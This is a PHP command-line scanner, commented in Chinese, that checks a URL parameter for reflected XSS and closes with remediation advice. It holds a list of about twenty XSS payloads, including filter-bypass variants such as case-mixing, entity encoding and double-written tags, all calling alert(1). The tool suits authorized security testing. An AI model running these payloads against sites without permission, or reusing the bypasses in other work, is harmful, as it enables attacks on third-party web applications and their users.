<?php
/**
 * xss_detector.php
 * XSS 漏洞检测工具 - PHP 安全实战
 *
 * 检测目标 URL 的 GET 参数是否存在反射型 XSS
 * 使用多种 Payload 测试，检测是否被反射到页面
 *
 * 仅用于安全学习和授权测试，禁止非法用途
 *
 * 使用方法：
 *   php xss_detector.php --url="http://target.com/search?q=test" --param=q
 */

$options = getopt('', ['url:', 'param:']);

if (empty($options['url']) || empty($options['param'])) {
    echo "XSS 漏洞检测工具\n\n";
    echo "用法: php xss_detector.php --url=URL --param=PARAM\n";
    echo "示例: php xss_detector.php --url='http://target.com/search?q=test' --param=q\n";
    exit(1);
}

$targetUrl = $options['url'];
$targetParam = $options['param'];

echo "========================================\n";
echo "  XSS 漏洞检测工具\n";
echo "  仅用于安全学习和授权测试\n";
echo "========================================\n";
echo "[*] 目标: $targetUrl\n";
echo "[*] 参数: $targetParam\n\n";

// HTTP 请求函数
function httpRequest($url) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Security Scanner)',
    ]);
    $response = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['body' => $response, 'code' => $code];
}

// 构造带 Payload 的 URL
function buildUrl($baseUrl, $param, $payload) {
    $parsed = parse_url($baseUrl);
    parse_str($parsed['query'] ?? '', $params);
    $params[$param] = $payload;
    $queryString = http_build_query($params);
    return "{$parsed['scheme']}://{$parsed['host']}{$parsed['path']}?$queryString";
}

// XSS Payload 列表
$payloads = [
    // 基础测试
    '<script>alert(1)</script>' => '基础 script 标签',
    '<img src=x onerror=alert(1)>' => 'img onerror 事件',
    '<svg onload=alert(1)>' => 'svg onload 事件',
    '"><script>alert(1)</script>' => '闭合属性注入 script',
    "'><script>alert(1)</script>" => '单引号闭合注入',
    '<body onload=alert(1)>' => 'body onload 事件',
    '<details open ontoggle=alert(1)>' => 'details ontoggle 事件',
    '<input onfocus=alert(1) autofocus>' => 'input onfocus 事件',

    // 绕过测试
    '<ScRiPt>alert(1)</ScRiPt>' => '大小写混合绕过',
    '<script>alert(String.fromCharCode(88,83,83))</script>' => 'CharCode 编码绕过',
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">' => 'HTML 实体编码绕过',
    '<iframe src="javascript:alert(1)"></iframe>' => 'iframe javascript 协议',
    '<a href="javascript:alert(1)">click</a>' => 'a 标签 javascript 协议',
    'javascript:alert(1)//' => 'javascript 伪协议',
    '<svg><script>alert(1)</script></svg>' => 'SVG 嵌套 script',
    '<scr<script>ipt>alert(1)</scr</script>ipt>' => '双写绕过',

    // 上下文测试
    '\'\';alert(1);//' => 'JS 字符串上下文',
    '</title><script>alert(1)</script>' => 'HTML 标题上下文',
    '*/alert(1)/*' => 'CSS 注释上下文',
    '--><script>alert(1)</script>' => 'HTML 注释上下文',
];

echo "--- 开始检测 ---\n\n";

$found = false;
$reflectedCount = 0;

foreach ($payloads as $payload => $desc) {
    // 发送请求
    $testUrl = buildUrl($targetUrl, $targetParam, $payload);
    $resp = httpRequest($testUrl);

    if ($resp['code'] == 0 || empty($resp['body'])) {
        echo "[!] 请求失败: $desc\n";
        continue;
    }

    // 检测 Payload 是否被原样反射
    $reflected = strpos($resp['body'], $payload) !== false;

    // 检测部分反射（编码或过滤后仍有残留）
    $partialReflected = false;
    if (!$reflected) {
        // 检查关键标记是否保留
        $keyTags = ['<script', 'onerror', 'onload', 'alert', 'javascript:'];
        foreach ($keyTags as $tag) {
            if (stripos($resp['body'], $tag) !== false && stripos($payload, $tag) !== false) {
                $partialReflected = true;
                break;
            }
        }
    }

    if ($reflected) {
        echo "[+] 反射成功! $desc\n";
        echo "    Payload: $payload\n";
        echo "    完整 Payload 被反射到页面\n";
        $found = true;
        $reflectedCount++;
    } elseif ($partialReflected) {
        echo "[?] 部分反射: $desc\n";
        echo "    Payload: $payload\n";
        echo "    关键标记被保留，可能存在过滤不严\n";
        $found = true;
        $reflectedCount++;
    } else {
        echo "[-] 未反射: $desc\n";
    }
}

echo "\n===== 检测结果 =====\n";
echo "测试 Payload 数: " . count($payloads) . "\n";
echo "反射成功数: $reflectedCount\n";

if ($found) {
    echo "\n[+] 目标可能存在 XSS 漏洞！\n";
    echo "    反射的 Payload 可以在用户浏览器中执行\n";
    echo "    修复建议：\n";
    echo "    1. 对用户输入进行 HTML 编码（htmlspecialchars）\n";
    echo "    2. 设置 Content-Security-Policy 响应头\n";
    echo "    3. Cookie 设置 HttpOnly 和 SameSite 属性\n";
} else {
    echo "\n[-] 未检测到 XSS 漏洞（输入被正确过滤或编码）\n";
}
